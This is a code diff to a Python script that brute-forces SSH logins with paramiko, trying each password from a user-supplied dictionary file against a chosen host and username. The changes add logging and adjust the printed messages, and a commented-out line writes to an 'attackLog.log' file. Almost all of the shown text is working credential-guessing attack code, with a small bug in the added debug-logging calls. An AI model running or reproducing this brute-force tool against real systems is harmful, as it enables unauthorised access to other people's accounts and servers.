@@ -11,6 +11,10 @@ import time
 import socket
 import  paramiko 
 import zipfile
+import logging
+import os
+
+from paramiko.util import log_to_file
 
 ##############################################################################
 # Declare Functions
@@ -37,17 +41,24 @@ def runCheckPass():
     wordList.close()
     print(" ")
 
-def sshConnect(ssh_host,ssh_user,ssh_pwd,connectStat = 0):
+def sshConnect(ssh_host,ssh_user,ssh_pwd, connectStat=0):
     ssh = paramiko.SSHClient() 
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
-
+    # logger = logging.basicConfig(filename= 'attackLog.log' ,level=logging.INFO, format= '%(asctime)s %(levelname)s:%(message)s') 
+    logger = logging.getLogger(__name__)
     try:
+        logger.debug("connecting to: " , ssh_host)
         ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd)
-
+        logger.debug("Successful Connection " , ssh_host )
+        
     except paramiko.AuthenticationException:
         connectStat = 1 # Failed Authentication
-    except socket.error as e:
+        logger.error(("*" * 10)+"Authentication Error"+("*" * 10)) 
+        
+    except socket.error:
         connectStat = 2 # Connection Failed
+        logger.error(("*" * 10) + "Conncection has Failed" +("*" * 10)) 
+       
     ssh.close()
     return connectStat
 
@@ -55,6 +66,7 @@ def bruteForce():
     ssh_host = input("Enter host: ")
     ssh_user = input("Enter username: ")
     filePath = input("Enter Dictionary File Path: \n")
+    
 
     with open(filePath, encoding="ISO-8859-1") as wordList:
         for passWrd in wordList:
@@ -65,9 +77,9 @@ def bruteForce():
                 print ('Succesful login to: ' + str(ssh_host) + ' username: ' + str(ssh_user) + ' password: ' + str(ssh_pwd))
                 break
             elif connection == 1:
-                print ('Unsucessful login with password: ' + str(ssh_pwd) )
+                print ('Unsucessful login with password: ' + str(ssh_pwd) + "\n")
             elif connection == 2:
-                print("Connection could not be establish to: " + str(ssh_host))
+                print("Connection could not be establish to: " + str(ssh_host) + "\n")
             else:
                 print ("UNKOWN ERROR")
     print(" ")
